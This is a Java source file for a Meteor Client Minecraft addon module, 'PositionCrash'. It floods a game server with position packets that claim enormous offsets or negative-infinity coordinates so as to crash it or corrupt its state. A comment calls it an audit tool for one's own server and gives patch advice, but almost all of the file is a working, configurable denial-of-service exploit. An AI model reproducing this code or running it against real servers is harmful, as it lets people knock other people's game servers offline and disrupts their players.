package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

/**
 * AUDIT: Position Crash (extreme and infinite coordinate flood)
 *
 * Three modes:
 *
 *   LARGE: claims to move 9412 blocks per packet, multiplied by packet index.
 *   After a few packets the claimed position is billions of blocks away,
 *   forcing chunk-load lookups (or chunk-map misses) at extreme coordinates.
 *
 *   HUGE: 500,000 blocks/packet — same principle at a faster pace.
 *
 *   INFINITY: sends Double.NEGATIVE_INFINITY in all three axes. Downstream
 *   arithmetic on Infinity (distance checks, chunk coordinate conversion,
 *   bounding-box math) produces NaN, which can poison persistent entity state
 *   or crash numeric code that expects finite values.
 *
 * Run at a low rate first (on-tick OFF) to confirm the server setbacks or
 * rejects, then enable on-tick to stress the rejection path repeatedly.
 *
 * Patch signal: reject any position claim whose delta from the last accepted
 * position exceeds a hard cap (e.g. 100 blocks) at the handler entry point,
 * before any chunk or world state is touched; always validate finiteness
 * before any arithmetic on incoming coordinates.
 *
 * Run against your OWN local server only.
 */
public class PositionCrash extends Module {
    public enum Mode { LARGE, HUGE, INFINITY }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").defaultValue(Mode.LARGE).build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets to send.")
        .defaultValue(5000).sliderRange(100, 10000).build()
    );
    private final Setting<Boolean> onTick = sgGeneral.add(new BoolSetting.Builder()
        .name("on-tick").description("Send packets every tick instead of once on enable.")
        .defaultValue(false).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public PositionCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "position-crash",
            "Floods position packets with large or infinite coordinates. Tests server movement bounds checking.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0;
        if (!onTick.get()) {
            sendPackets();
            if (autoDisable.get()) toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (onTick.get()) sendPackets();
    }

    private void sendPackets() {
        if (mc.player == null) return;
        ticksActive++;
        for (int i = 0; i < amount.get(); i++) {
            double x = mc.player.getX(), y = mc.player.getY(), z = mc.player.getZ();
            PlayerMoveC2SPacket.PositionAndOnGround pkt = switch (mode.get()) {
                case LARGE    -> new PlayerMoveC2SPacket.PositionAndOnGround(x + 9412.0 * i, y + 9412.0 * i, z + 9412.0 * i, true, false);
                case HUGE     -> new PlayerMoveC2SPacket.PositionAndOnGround(x + 500000.0 * i, y + 500000.0 * i, z + 500000.0 * i, true, false);
                case INFINITY -> new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true, false);
            };
            mc.player.networkHandler.sendPacket(pkt);
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
